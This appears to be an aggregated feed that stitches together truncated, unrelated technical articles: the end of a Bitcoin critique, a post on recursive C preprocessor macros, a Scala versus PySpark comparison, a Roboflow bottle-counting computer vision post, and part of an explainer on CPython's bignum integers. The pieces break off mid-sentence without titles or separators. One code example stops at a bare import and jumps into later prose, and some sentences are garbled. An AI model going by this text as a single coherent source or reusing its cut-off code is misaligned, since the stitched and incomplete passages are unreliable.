a medium of exchange and to change hands.</p><p>Also, I see rampant misunderstanding of basic economics in people who advocate for it:</p><ul><li><p>they say that the fact that it is deflationary and can not see inflation is a good thing, when it is
actually a bad thing. There is a reason the target inflation is at ~2% almost everywhere.
We need inflation to keep the economy going.</p></li><li><p>they say that it's a currency, when it's not. It is not accessible to everybody
(not everybody has access to internet).</p></li><li><p>if you lose your key, you lose the access to your wallet for good and nobody can help you.
People seem to not understand how bad this is. Imagine people losing everything because of one silly mistake.</p></li><li><p>Volatility is the enemy of any economy market: we need stability and predictability to avoid mayhem:
businesses need predictability to prepare their stocks, factories need predictability to produce goods,
people need predictability to budget and make long-term plans. Sure, long term plans usually don't go as planned,
but you don't want to rethink your entire strategy on a weekly basis because of some wild fluctuation (this week a
car costs 0.5BTC, next week it will be 5BTC). Because of volatility you can't even save for the future.</p></li></ul><p>Also, as a technology, blockchain itself it's not that impressive. At its core, it is a decentralized
slow read-only database which needs as lot of power to run, which do not have many real-life useful applications.
Yeah, some would argue that having a decentralized zero-trust database would be an advantage, but
I am yet to see a system using blockchain, where a normal database is not enough.</p><p>The only real-life application I could see is in audit trailing, where the decentralization part
is useless (only the chaining of blocks by hashing is useful there, to avoid tampering with past entries),
but that use-case is not related to the reason blockchain advocates promote it.</p><p>Every time some company announces that they will build their own blockchain solution, the blockchain
community celebrates, because they consider it to be proof that blockchain is the future, but in fact,
it's a massive counter-argument against the core belief they promote: decentralization.
The fact that a company is building their own, it means that they will control it.</p><h3>Conclusion</h3><p>In my opinion, Bitcoin is a fad and it's value is given by two things: people who have too much faith in an asset that
is not really an asset and has no use except offering a field for speculation, and the FOMO of people who get caught in
the heat of the moment and buy when a friend tells them to buy or mass-media brings it to the public attention
once very few months.</p><p>This article is a personal opinion, and represents no financial advice. I am in not saying "sell" or "buy".
Do your own research (thoroughly).</p></div></div></div>]]>

<![CDATA[Is the C preprocessor Turing complete?]]>

February 8, 2021 | https://pfultz2.com/blog/2012/05/10/turing/ | <a href="https://web.archive.org/web/*/https://pfultz2.com/blog/2012/05/10/turing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>One of the requirements for a language to be turing complete, is that it must be able to implement recursion. As we all know macros don’t expand recursively, but there are ways we can work around this.</p>

<p>The easiest way of doing recursion in the preprocessor is to use a deferred expression. A deferred expression is an expression that requires more scans to fully expand:</p>

<div><div><pre><code>#define EMPTY()
#define DEFER(id) id EMPTY()
#define OBSTRUCT(...) __VA_ARGS__ DEFER(EMPTY)()
#define EXPAND(...) __VA_ARGS__

#define A() 123
A() // Expands to 123
DEFER(A)() // Expands to A () because it requires one more scan to fully expand
EXPAND(DEFER(A)()) // Expands to 123, because the EXPAND macro forces another scan
</code></pre></div></div>

<p>Why is this important? Well when a macro is scanned and expanding, it creates a disabling context. This disabling context will cause a token, that refers to the currently expanding macro, to be painted blue. Thus, once its painted blue, the macro will no longer expand. This is why macros don’t expand recursively. However, a disabling context only exists during one scan, so by deferring an expansion we can prevent our macros from becoming painted blue. We will just need to apply more scans to the expression. We can do that using this <code>EVAL</code> macro:</p>

<div><div><pre><code>#define EVAL(...)  EVAL1(EVAL1(EVAL1(__VA_ARGS__)))
#define EVAL1(...) EVAL2(EVAL2(EVAL2(__VA_ARGS__)))
#define EVAL2(...) EVAL3(EVAL3(EVAL3(__VA_ARGS__)))
#define EVAL3(...) EVAL4(EVAL4(EVAL4(__VA_ARGS__)))
#define EVAL4(...) EVAL5(EVAL5(EVAL5(__VA_ARGS__)))
#define EVAL5(...) __VA_ARGS__
</code></pre></div></div>

<p>Now if we want to implement a <code>REPEAT</code> macro using recursion, first we need some increment and decrement operators to handle state:</p>

<div><div><pre><code>#define CAT(a, ...) PRIMITIVE_CAT(a, __VA_ARGS__)
#define PRIMITIVE_CAT(a, ...) a ## __VA_ARGS__

#define INC(x) PRIMITIVE_CAT(INC_, x)
#define INC_0 1
#define INC_1 2
#define INC_2 3
#define INC_3 4
#define INC_4 5
#define INC_5 6
#define INC_6 7
#define INC_7 8
#define INC_8 9
#define INC_9 9

#define DEC(x) PRIMITIVE_CAT(DEC_, x)
#define DEC_0 0
#define DEC_1 0
#define DEC_2 1
#define DEC_3 2
#define DEC_4 3
#define DEC_5 4
#define DEC_6 5
#define DEC_7 6
#define DEC_8 7
#define DEC_9 8
</code></pre></div></div>

<p>Next we need a few more macros to do logic:</p>

<div><div><pre><code>#define CHECK_N(x, n, ...) n
#define CHECK(...) CHECK_N(__VA_ARGS__, 0,)

#define NOT(x) CHECK(PRIMITIVE_CAT(NOT_, x))
#define NOT_0 ~, 1,

#define COMPL(b) PRIMITIVE_CAT(COMPL_, b)
#define COMPL_0 1
#define COMPL_1 0

#define BOOL(x) COMPL(NOT(x))

#define IIF(c) PRIMITIVE_CAT(IIF_, c)
#define IIF_0(t, ...) __VA_ARGS__
#define IIF_1(t, ...) t

#define IF(c) IIF(BOOL(c))

#define EAT(...)
#define EXPAND(...) __VA_ARGS__
#define WHEN(c) IF(c)(EXPAND, EAT)
</code></pre></div></div>

<p>Now with all these macros we can write a recursive <code>REPEAT</code> macro. We use a <code>REPEAT_INDIRECT</code> macro to refer back to itself recursively. This prevents the macro from being painted blue, since it will expand on a different scan(and using a different disabling context). We use <code>OBSTRUCT</code> here, which will defer the expansion twice. This is necessary because the conditional <code>WHEN</code> applies one scan already.</p>

<div><div><pre><code>#define REPEAT(count, macro, ...) \
    WHEN(count) \
    ( \
        OBSTRUCT(REPEAT_INDIRECT) () \
        ( \
            DEC(count), macro, __VA_ARGS__ \
        ) \
        OBSTRUCT(macro) \
        ( \
            DEC(count), __VA_ARGS__ \
        ) \
    )
#define REPEAT_INDIRECT() REPEAT

//An example of using this macro
#define M(i, _) i
EVAL(REPEAT(8, M, ~)) // 0 1 2 3 4 5 6 7
</code></pre></div></div>

<p>Now this example is limited to 10 repeats, because of limitations of the counter. Just like a repeat counter in a computer would be limited by the finite memory. Multiple repeat counters could be combined together to workaround this limitation, just like in a computer. Furthermore, we could define a <code>FOREVER</code> macro:</p>

<div><div><pre><code>#define FOREVER() \
    ? \
    DEFER(FOREVER_INDIRECT) () ()
#define FOREVER_INDIRECT() FOREVER
// Outputs question marks forever
EVAL(FOREVER())
</code></pre></div></div>

<p>This will try to output <code>?</code> forever, but will eventually stop because there are no more scans being applied. Now the question is, if we gave it an infinite number of scans would this algorithm complete? This is known as the halting problem, and Turing completeness is necessary to prove the undecidability of the halting problem. So as you can see, the preprocessor can act as a Turing complete language, but instead of being limited to the finite memory of a computer it is instead limited by the finite number of scans applied.</p>

<p>Apache Spark code can be written with the Scala, Java, Python, or R APIs.</p>



<p>Scala and Python are the most popular APIs. This blog post performs a detailed comparison of writing Spark with Scala and Python and helps users choose the language API that’s best for their team.</p>



<p>Both language APIs are great options for most workflows. Spark lets you write elegant code to run jobs on massive datasets – it’s an amazing technology.</p>



<p>Choosing the right language API is an important decision. It’s hard to switch once you develop core libraries with one language.</p>



<p>Making the right choice is difficult because of common misconceptions like “Scala is 10x faster than Python”, which are completely misleading when comparing Scala Spark and PySpark.</p>



<p>TL;DR:</p>



<ul><li>PySpark used to be buggy and poorly supported, but that’s not true anymore. Python is a first class citizen in Spark. PySpark is a great option for most workflows.</li><li>More people are familiar with Python, so PySpark is naturally their first choice when using Spark.</li><li>Many programmers are terrified of Scala because of its reputation as a super-complex language. They don’t know that Spark code can be written with basic Scala language features that you can learn in a day. You don’t need to “learn Scala” or “learn functional programming” to write Spark code with Scala. You can stick to basic language features like <code>if</code>, <code>class</code>, and <code>object</code>, write code that looks exactly like Python, and enjoy the benefits of the Scala ecosystem.</li><li>Scala is a compile-time, type-safe language, so it offers certain features that cannot be offered in PySpark, like Datasets. Compile time checks give an awesome developer experience when working with an IDE like IntelliJ.</li><li>A lot of the Scala advantages don’t matter in the Databricks notebook environment. Notebooks don’t support features offered by IDEs or production grade code packagers, so if you’re going to strictly work with notebooks, don’t expect to benefit from Scala’s advantages.</li><li>Python has great libraries, but most are not performant / unusable when run on a Spark cluster, so Python’s “great library ecosystem” argument doesn’t apply to PySpark (unless you’re talking about libraries that you know are performant when run on clusters).</li></ul>



<p>Let’s dig into the details and look at code to make the comparison more concrete.</p>



<h2>Chaining DataFrame transformations</h2>



<p>This section demonstrates how the <code>transform</code> method can elegantly invoke Scala functions (because functions can take two parameter lists) and isn’t quite as easy with Python.</p>



<p>Custom transformations are a great way to package Spark code. They’re easily reusable and can be composed for different analyses. They’re also easily testable as standalone units.</p>



<p>Suppose you have the following DataFrame.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+
| country|
+--------+
|  brasil|
|colombia|
|    null|
+--------+</pre>



<p>Here’s a Scala function that’ll append some text to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def funify(colName: String, str: String)(df: DataFrame): DataFrame = {
  df.withColumn("funified", concat(col(colName), lit(" "), lit(str)))
}</pre>



<p>Here’s how to invoke the Scala function with the <code>Dataset#transform</code> method:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df
  .transform(funify("country", "is awesome"))
  .show()</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+-------------------+
| country|           funified|
+--------+-------------------+
|  brasil|  brasil is awesome|
|colombia|colombia is awesome|
|    null|               null|
+--------+-------------------+</pre>



<p>Notice how the <code>funify</code> function is defined with two parameter lists and invoked with one set of arguments. The Scala programming language allows for this elegant syntax.</p>



<p>Here’s an equivalent PySpark function that’ll append to the <code>country</code> column:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pyspark.sql.functions import col, lit, concat

def funify(col_name, str):
    def _(df):
        return df.withColumn("funified", concat(col(col_name), lit(" "), lit(str)))
    return _</pre>



<p>Here’s how to invoke the Python function with <code>DataFrame#transform</code>:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">df.transform(funify("country", "is super fun!")).show(truncate=False)</pre>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">+--------+----------------------+
|country |funified              |
+--------+----------------------+
|colombia|colombia is super fun!|
|brasil  |brasil is super fun!  |
|null    |null                  |
+--------+----------------------+</pre>



<p>There are <a href="https://mungingdata.com/pyspark/chaining-dataframe-transformations/">a lot of different ways to define custom PySpark transformations</a>, but nested functions seem to be the most popular.</p>



<p>Nested functions aren’t the best. They create an extra level of indentation and require two return statements, which are easy to forget. The comparative difficulty of chaining PySpark custom transformations is a downside.</p>



<h2>Datasets vs DataFrames</h2>



<p>Datasets can only be implemented in languages that are compile-time type-safe. Java and Scala are compile-time type-safe, so they support Datasets, but Python and R are not compile-time type-safe, so they only support DataFrames.</p>



<p>Datasets so useful in practice.</p>



<ul><li>It’s easy to perform operations <a href="https://mungingdata.com/apache-spark/dataset-tods-createdataset-advantages/">that’ll convert a Dataset to a DataFrame</a> (e.g. adding a column).</li><li>Datasets <a href="https://stackoverflow.com/questions/40596638/spark-2-0-dataset-vs-dataframe/40602882#40602882">are less performant</a> although <a href="https://izeigerman.medium.com/making-the-spark-dataframe-composition-type-safe-r-7b6fed524ec2">the performance gap is supposedly narrowing</a></li><li><a href="https://github.com/typelevel/frameless/">Expressively typed Datasets</a> sound promising, but <a href="https://mungingdata.com/apache-spark/frameless-typed-datasets/">aren’t practical yet</a></li></ul>



<p>Datasets shouldn’t be considered to be a huge advantage because most Scala programmers use DataFrames anyways.</p>



<h2>Feature parity</h2>



<p>PySpark generally supports all the features in Scala Spark, with a few exceptions.</p>



<p>The <code>CalendarIntervalType</code> has been in the Scala API since Spark 1.5, but still isn’t in the PySpark API as of Spark 3.0.1. This is a “serious loss of function” and <a href="https://github.com/apache/spark/pull/29935">will hopefully get added</a>.</p>



<p>In general, both the Python and Scala APIs support the same functionality. Spark knows that a lot of users avoid Scala/Java like the plague and they need to provide excellent Python support.</p>



<h2>Performance comparison</h2>



<p>Scala and PySpark should perform relatively equally for DataFrame operations.</p>



<p><a href="https://stackoverflow.com/questions/32464122/spark-performance-for-scala-vs-python">This thread</a> has a dated performance comparison.</p>



<p><a href="https://news.ycombinator.com/item?id=26030970">“Regular” Scala code can run 10-20x faster than “regular” Python code</a>, but that PySpark isn’t executed liked like regular Python code, so this performance comparison isn’t relevant.</p>



<p>PySpark is converted to Spark SQL and then executed on a JVM cluster. It’s not a traditional Python execution environment. Benchmarks for other Python execution environments are irrelevant for PySpark.</p>



<p>Watch out! Some other blog posts imply that PySpark is 10x slower which just isn’t true.</p>



<h2>Code editing</h2>



<p>The IntelliJ community edition provides a powerful Scala integrated development environment with out of the box. If provides you with code navigation, type hints, function completion, and compile-time runtime error reporting.</p>



<p>There’s also a <a href="https://scalameta.org/metals/">Metals</a> project that allows for IDE-like text editor features in Vim or VSCode. Use IntelliJ if you’d like a full-serviced solution that works out of the box. Metals is good for those who enjoy text editor tinkering and custom setups.</p>



<p>Scala provides excellent text editors for working with Spark.</p>



<p>Some folks develop Scala code without the help of either Metals or IntelliJ, which puts you at a disadvantage. Scala IDEs give you a lot of help for free. Scala devs that reject free help from their text editor will suffer unnecessarily.</p>



<p>PyCharm doesn’t work out of the box with PySpark, <a href="https://stackoverflow.com/questions/34685905/how-to-link-pycharm-with-pyspark">you need to configure it</a>. <a href="https://github.com/zero323/pyspark-stubs">pyspark-stubs</a> provide some nice error messages and autocompletion, but nothing compared to what’s offered by Scala/IntelliJ.</p>



<p>Scala has the edge for the code editor battle.</p>



<h2>Compile time exceptions</h2>



<p>Here’s what IntelliJ will show when you try to invoke a Spark method without enough arguments.</p>

<p>The PyCharm error only shows up when pyspark-stubs is included and is more subtle.</p>



<figure><img loading="lazy" width="916" height="64" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM.png 916w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-300x21.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.13.57-AM-768x54.png 768w" sizes="(max-width: 916px) 100vw, 916px"></figure>



<p>At least you can hover over the method and get a descriptive hint.</p>



<figure><img loading="lazy" width="1024" height="384" src="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png" alt="" srcset="https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1024x384.png 1024w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-300x113.png 300w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-768x288.png 768w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM-1025x384.png 1025w, https://mungingdata.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-08-at-10.15.06-AM.png 1120w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Code navigation</h2>



<p>IntelliJ/Scala let you easily navigate from your code directly to the relevant parts of the underlying Spark code. Suppose your cursor is on the <code>regexp_extract</code> function. You can pretty Command + b to go directly to <code>org.apache.spark.sql.functions.regexp_extract</code> and then continue pressing Command + b to see exactly how the function is working under the hood.</p>



<p>PySpark code navigation is severely lacking in comparison. You can navigate to functions within your codebase, but you’ll be directed to the stub file if you try to jump to the underlying PySpark implementations of core functions.</p>



<p>PySpark code navigation can’t be as good due to Python language limitations.</p>



<h2>Packaging JARs vs Wheels</h2>



<p>Scala projects can be packaged as JAR files and uploaded to Spark execution environments like Databricks or EMR where the functions are invoked in production. JAR files can be assembled without dependencies (thin JAR files) or with dependencies (fat JAR files). Scala makes it easy to customize your fat JAR files to exclude the test dependencies, exclude Spark (because that’s already included by your runtime), and contain other project dependencies. See <a href="https://mungingdata.com/apache-spark/building-jar-sbt/">this blog</a> for more on building JAR files.</p>



<p>You can even overwrite the packages for the dependencies in fat JAR files to avoid namespace conflicts by leveraging a process called shading.</p>



<p>Suppose <code>com.your.org.projectXYZ</code> depends on <code>com.your.org.projectABC</code> and you’d like to attach <code>projectXYZ</code> to a cluster as a fat JAR file. You’d like <code>projectXYZ</code> to use version 1 of <code>projectABC</code>, but would also like to attach version 2 of <code>projectABC</code> separately. When <code>projectXYZ</code> calls <code>com.your.org.projectABC.someFunction</code>, it should use version 1. All other invocations of <code>com.your.org.projectABC.someFunction</code> should use version 2.</p>



<p>You can shade <code>projectABC</code> in the <code>projectXYZ</code> fat JAR file, so the path is something like <code>projectAbcShaded.projectABC</code>, to prevent namespace conflicts for when <code>projectABC</code> version 2 is attached to the cluster. See <a href="https://mungingdata.com/apache-spark/shading-dependencies-with-sbt/">here</a> for more details on shading.</p>



<p>Shading is a great technique to avoid dependency conflicts and dependency hell.</p>



<p>Python doesn’t support building fat wheel files or shading dependencies. This <a href="https://databricks.com/blog/2020/12/22/how-to-manage-python-dependencies-in-pyspark.html">blog post</a> explains some of …</p></div></article></div>

              <div>
                <div><p>Last night during Super Bowl LV, Mountain Dew ran an ad featuring John Cena riding through a Mountain Dew-themed amusement park. Bottles are scattered all over the scene: neon signs on buildings, in fun house mirrors, and flying out of the car trunk.</p><p>At the end of the ad, John Cena challenges the audience: <strong>The first person to tweet at Mountain Dew the exact number of bottles that appear in the commercial is eligible to win $1 million.</strong></p><p>Watch the ad for yourself here:</p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/9cEiYQwYLPk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>When we heard that a task called for careful visual inspection and counting, we knew <a href="https://blog.roboflow.com/intro-to-computer-vision/">computer vision</a> would be a helpful tool. So, we did what any developer would do: trained an <a href="https://models.roboflow.com/object-detection">object detection model</a> to recognize bottles that appear throughout the scene. </p><figure><img src="https://blog.roboflow.com/content/images/2021/02/Winning_1_Million_with_Computer_Vision_Mountain_Dew_Super_Bowl_Contest.gif" alt="Counting Mountain Dew Contest with Computer Vision"><figcaption>A three-second example of the model finding Mountain Dew bottles in the scene.</figcaption></figure><p>In this case, <strong>we're using a <a href="https://models.roboflow.com/">computer vision model</a> to help us find any bottles we may have otherwise missed.</strong> The viewer should still identify the unique occurrences of each bottle across the scene when tweeting a submission.</p><p>Per the <a href="https://www.lifechangingdew.com/rules">Official Rules</a>, any type of bottle counts – but each bottle should only be counted once. (For example, the bottle in the car John Cena drinks from is present multiple different times, but it should only be counted once towards the tally.) </p><p>Let's dive in.</p><h3 id="preparing-a-dataset">Preparing a Dataset</h3><p>First, we need a dataset of images from the ad. In this case, we can grab the exact video file of the commercial. We'll need to <a href="https://blog.roboflow.com/using-video-computer-vision/">split the video file into individual image frames</a> in order to annotate the images and train a model.</p><p>I created a dataset and dropped the Mountain Dew video into Roboflow, which asks what frame rate I'd like to sample. I decided on doing three frames per second, which creates 92 images from the roughly 30-second Super Bowl spot.</p><figure><img src="https://blog.roboflow.com/content/images/2021/02/Winning_1_Million_with_Computer_Vision_Mountain_Dew_Super_Bowl_Contest-upload.gif" alt="Turning video into images for computer vision."><figcaption>Selecting a three frames per second rate for the commercial.</figcaption></figure><p>Having each of the individual frames from the video is independently helpful: it means we can have a closer look at all of the places where the Mountain Dew bottles may be present.</p><p>Once we have these images, we need to <a href="https://docs.roboflow.com/annotate">annotate</a> all of the bottles we can find in each of the scenes. While this is fairly similar to counting all of the bottles manually, remember we might not be perfect in finding all of the bottles with our own eyes. So, hopefully, in teaching a computer vision model what bottles look like and then asking that same model to find bottles for us, we'll see any we may have missed.</p><figure><img src="https://blog.roboflow.com/content/images/2021/02/annotating-bottles.png" alt="Labeling bottles for computer vision" srcset="https://blog.roboflow.com/content/images/size/w600/2021/02/annotating-bottles.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/02/annotating-bottles.png 1000w, https://blog.roboflow.com/content/images/2021/02/annotating-bottles.png 1573w" sizes="(min-width: 720px) 720px"><figcaption>Annotating all of the Mountain Dew bottles in each of our images.</figcaption></figure><p>After labeling (and deleting one completely black image from the vid), we have 869 annotations across 91 images.

<!-- /.post-info -->      <p>In the previous parts of this series we studied the core of the CPython interpreter and saw how the most fundamental aspects of Python are implemented. We made an overview of <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">the CPython VM</a>, took a look at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">the CPython compiler</a>, stepped through <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">the CPython source code</a>, studied <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">how the VM executes the bytecode</a> and learned <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-5-how-variables-are-implemented-in-cpython/">how variables work</a>. In the two most recent posts we focused on <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">the Python object system</a>. We learned what Python objects and Python types are, how they are defined and what determines their behavior. This discussion gave us a good understanding of how Python objects work in general. What we haven't discussed is how particular objects, such as strings, integers and lists, are implemented. In this and several upcoming posts we'll cover the implementations of the most important and most interesting built-in types. The subject of today's post is <code>int</code>.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Why Python integers are interesting</h2>
<p>Integers require no introduction. They are so ubiquitous and seem so basic that you may doubt whether it's worth discussing how they are implemented at all. Yet, Python integers are interesting because they are not just 32-bit or 64-bit integers that CPUs work with natively. Python integers are <a href="https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic">arbitrary-precision integers</a>, also known as bignums. This means that they can be as large as we want, and their sizes are only limited by the amount of available memory.</p>
<p>Bignums are handy to work with because we don't need to worry about such things as integer overflows and underflows. They are extensively used in fields like cryptography and computer algebra where large numbers arise all the time and must be represented precisely. So, <a href="https://en.wikipedia.org/wiki/List_of_arbitrary-precision_arithmetic_software">many</a> programming languages have bignums built-in. These include Python, JavaScript, Ruby, Haskell, Erlang, Julia, Racket. Others provide bignums as a part of the standard library. These include Go, Java, C#, D, PHP. Numerous third-party libraries implement bignums. The most popular one is <a href="https://en.wikipedia.org/wiki/GNU_Multiple_Precision_Arithmetic_Library">the GNU Multiple Precision Arithmetic Library</a> (GMP). It provides a C API but has bindings for all major languages.</p>
<p>There are a lot of bignum implementations. They're different in detail, but the general approach to implement bignums is the same. Today we'll see what this approach looks like and use CPython's implementation as a reference example. The two main questions we'll have to answer are:</p>
<ul>
<li>how to represent bignums; and</li>
<li>how to performs arithmetic operations, such as addition and multiplication, on bignums.</li>
</ul>
<p>We'll also discuss how CPython's implementation compares to others and what CPython does to make integers more efficient. </p>
<h2>Bignum representation</h2>
<p>Think for a moment how you would represent large integers in your program if you were to implement them yourself. Probably the most obvious way to do that is to store an integer as a sequence of digits, just like we usually write down numbers. For example, the integer <code>51090942171709440000</code> could be represented as <code>[5, 1, 0, 9, 0, 9, 4, 2, 1, 7, 1, 7, 0, 9, 4, 4, 0, 0, 0, 0]</code>. This is essentially how bignums are represented in practice. The only important difference is that instead of base 10, much larger bases are used. For example, CPython uses base 2^15 or base 2^30 depending on the platform. What's wrong with base 10? If we represent each digit in a sequence with a single byte but use only 10 out of 256 possible values, it would be very memory-inefficient. We could solve this memory-efficiency problem if we use base 256, so that each digit takes a value between 0 and 255. But still much larger bases are used in practice. The reason for that is because larger base means that numbers have less digits, and the less digits numbers have, the faster arithmetic operations are performed. The base cannot be arbitrary large. It's typically limited by the size of the integers that the CPU can work with. We'll see why this is the case when we discuss bignum arithmetic in the next section. Now let's take a look at how CPython represents bignums.</p>
<p>Everything related to the representation of Python integers can be found in <a href="https://github.com/python/cpython/blob/3.9/Include/longintrepr.h"><code>Include/longintrepr.h</code></a>. Technically, Python integers are instances of <code>PyLongObject</code>, which is defined in <a href="https://github.com/python/cpython/blob/3.9/Include/longobject.h"><code>Include/longobject.h</code></a>, but <code>PyLongObject</code> is actually a typedef for <code>struct _longobject</code> that is defined in <code>Include/longintrepr.h</code>:</p>
<div><pre><span></span><span>struct</span> <span>_longobject</span> <span>{</span>
    <span>PyVarObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_VAR_HEAD macro</span>
    <span>digit</span> <span>ob_digit</span><span>[</span><span>1</span><span>];</span>
<span>};</span>
</pre></div>


<p>This struct extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyVarObject"><code>PyVarObject</code></a>, which in turn extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a>:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span>
    <span>Py_ssize_t</span> <span>ob_size</span><span>;</span> <span>/* Number of items in variable part */</span>
<span>}</span> <span>PyVarObject</span><span>;</span>
</pre></div>


<p>So, besides a reference count and a type that all Python objects have, an integer object has two other members: </p>
<ul>
<li><code>ob_size</code> that comes from <code>PyVarObject</code>; and </li>
<li><code>ob_digit</code> that is defined in <code>struct _longobject</code>.</li>
</ul>
<p>The <code>ob_digit</code> member is a pointer to an array of digits. On 64-bit platforms, each digit is a 30-bit integer that takes values between 0 and 2^30-1 and is stored as an unsigned 32-bit int (<code>digit</code> is a typedef for <code>uint32_t</code>). On 32-bit platforms, each digit is a 15-bit integer that takes values between 0 and 2^15-1 and is stored as an unsigned 16-bit int (<code>digit</code> is a typedef for <code>unsigned short</code>). To make things concrete, in this post we'll assume that digits are 30 bits long.</p>
<p>The <code>ob_size</code> member is a signed int, whose absolute value tells us the number of digits in the <code>ob_digit</code> array. The sign of <code>ob_size</code> indicates the sign of the integer. Negative <code>ob_size</code> means that the integer is negative. If <code>ob_size</code> is 0, then the integer is 0.</p>
<p>Digits are stored in a little-endian order. The first digit (<code>ob_digit[0]</code>) is the least significant, and the last digit (<code>ob_digit[abs(ob_size)-1]</code>) is the most significant.</p>
<p>Finally, the absolute value of an integer is calculated as follows: </p>
<p>$$val = ob\_digit[0] \times (2 ^{30})^0 + ob\_digit[1] \times (2 ^{30})^1 + \cdots + ob\_digit[|ob\_size| - 1] \times (2 ^{30})^{|ob\_size| - 1}$$</p>
<p>Let's see what all of this means with an example. Suppose we have an integer object that has <code>ob_digit = [3, 5, 1]</code> and <code>ob_size = -3</code>. To compute its value, we can do the following:</p>
<div><pre><span></span><span>$ python -q</span>
<span>&gt;&gt;&gt; </span><span>base</span> <span>=</span> <span>2</span><span>**</span><span>30</span>
<span>&gt;&gt;&gt; </span><span>-</span><span>(</span><span>3</span> <span>*</span> <span>base</span><span>**</span><span>0</span> <span>+</span> <span>5</span> <span>*</span> <span>base</span><span>**</span><span>1</span> <span>+</span> <span>1</span> <span>*</span> <span>base</span><span>**</span><span>2</span><span>)</span>
<span>-1152921509975556099</span>
</pre></div>


<p>Now let's do the reverse. Suppose we want to get the bignum representation of the number <code>51090942171709440000</code>. Here's how we can do that:</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>x</span> <span>=</span> <span>51090942171709440000</span>
<span>&gt;&gt;&gt; </span><span>x</span> <span>%</span> <span>base</span>
<span>952369152</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>337507546</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>44</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>0</span>
</pre></div>


<p>So, <code>ob_digit = [952369152, 337507546, 44]</code> and <code>ob_size = 3</code>. Actually, we don't even have to compute the digits, we can get them by inspecting the integer object using the <a href="https://docs.python.org/3/library/ctypes.html#module-ctypes"><code>ctypes</code></a> standard library:</p>
<div><pre><span></span><span>import</span> <span>ctypes</span>

<p>As you might guess, the representation of bignums is an easy part. The main challenge is to implement arithmetic operations and to implement them efficiently.</p>
<h2>Bignum arithmetic</h2>
<p>We learned in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">part 6</a> that the behavior of a Python object is determined by the object's type. Each member of a type, called slot, is responsible for a particular aspect of the object's behavior. So, to understand how CPython performs arithmetic operations on integers, we need to study the slots of the <code>int</code> type that implement those operations.</p>
<p>In the C code, the <code>int</code> type is called <code>PyLong_Type</code>. It's defined in <code>Objects/longobject.c</code> as follows:</p>
<div><pre><span></span><span>PyTypeObject</span> <span>PyLong_Type</span> <span>=</span> <span>{</span>

